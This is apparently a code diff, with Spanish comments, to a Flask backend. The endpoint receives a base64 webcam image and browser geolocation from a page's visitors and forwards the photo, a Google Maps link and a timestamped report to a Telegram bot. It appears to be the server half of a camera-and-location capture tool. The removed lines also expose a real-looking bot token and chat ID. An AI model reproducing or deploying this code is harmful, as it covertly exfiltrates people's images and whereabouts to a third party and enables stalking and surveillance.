@@ -5,9 +5,9 @@ import requests
 
 app = Flask(__name__)
 
-# ✅ TUS DATOS (SIN CAMBIARLOS)
-TOKEN = "8761804922:AAFSHTi1qk7XPoS-kn1Zncf7Y8o8gNpAbnM"
-CHAT_ID = "8114050673"
+# ⚠️ PEGA AQUÍ TU TOKEN Y CHAT_ID
+TOKEN = "AQUI_TU_TOKEN"
+CHAT_ID = "AQUI_TU_ID"
 
 @app.route('/')
 def index():
@@ -19,12 +19,6 @@ def enviar():
     try:
         data = request.json
 
-        if not data:
-            return "Error: sin datos"
-
-        if 'imagen' not in data:
-            return "Error: sin imagen"
-
         imagen = data['imagen'].split(',')[1]
         fecha = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 
@@ -32,9 +26,9 @@ def enviar():
         with open("foto.png", "wb") as f:
             f.write(base64.b64decode(imagen))
 
-        # ubicación (SIN TOCAR TU LÓGICA)
-        if data.get('lat') not in ["Denegado", "No permitido", None]:
-            mapa = f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
+        # ubicación
+        if data['lat'] not in ["Denegado", "No permitido"]:
+            mapa = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
         else:
             mapa = "No disponible"
 
@@ -59,19 +53,19 @@ def enviar():
             "┗━━━━━━━━━━━━━━━━━━━━━┙"
         )
 
-        # enviar texto (CON CONTROL DE ERROR)
-        r1 = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={
+        # enviar texto a Telegram
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={
             "chat_id": CHAT_ID,
             "text": reporte
         })
 
         # enviar foto
         with open("foto.png", "rb") as foto:
-            r2 = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data={
+            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data={
                 "chat_id": CHAT_ID
             }, files={"photo": foto})
 
-        return f"OK {r1.status_code} {r2.status_code}"
+        return "OK"
 
     except Exception as e:
         return f"Error: {str(e)}"
